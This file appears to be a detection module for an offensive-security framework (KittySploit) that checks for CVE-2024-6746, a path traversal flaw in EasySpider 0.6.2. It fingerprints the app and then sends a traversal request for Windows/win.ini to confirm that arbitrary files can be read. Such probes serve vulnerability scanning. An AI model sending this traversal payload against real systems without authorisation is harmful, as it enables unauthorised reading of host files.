#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability classified as problematic was found in NaiboWang EasySpider 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EasySpider 0.6.2 - Arbitrary File Read Detection',
        'description': "A vulnerability classified as problematic was found in NaiboWang EasySpider 0.6.2 on Windows. Affected by this vulnerability is an unknown functionality of the file \\EasySpider\\resources\\app\\server.js of the component HTTP GET Request Handler. The manipulation with the input /../../../../../../../../../Windows/win.ini leads to path traversal: '../filedir'. The attack needs to be done within the local network.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'lfi', 'network', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/NaiboWang/EasySpider/issues/466',
            'https://cvefeed.io/vuln/detail/CVE-2024-6746',
            'https://vuldb.com/?id.271477',
            'https://vuldb.com/?submit.371998',
            'https://vuldb.com/?ctiid.271477',
        ],
        'cve': 'CVE-2024-6746',
    }

    def run(self):
        path = '/taskGrid/tasklist.html'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Task List', 'Task ID', 'Task Name', 'URL', '<title>任务列表 | Task List</title>',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/../../../../../../../../../Windows/win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='EasySpider 0.6.2 - Arbitrary File Read detected', path=path)
            return True
        return False

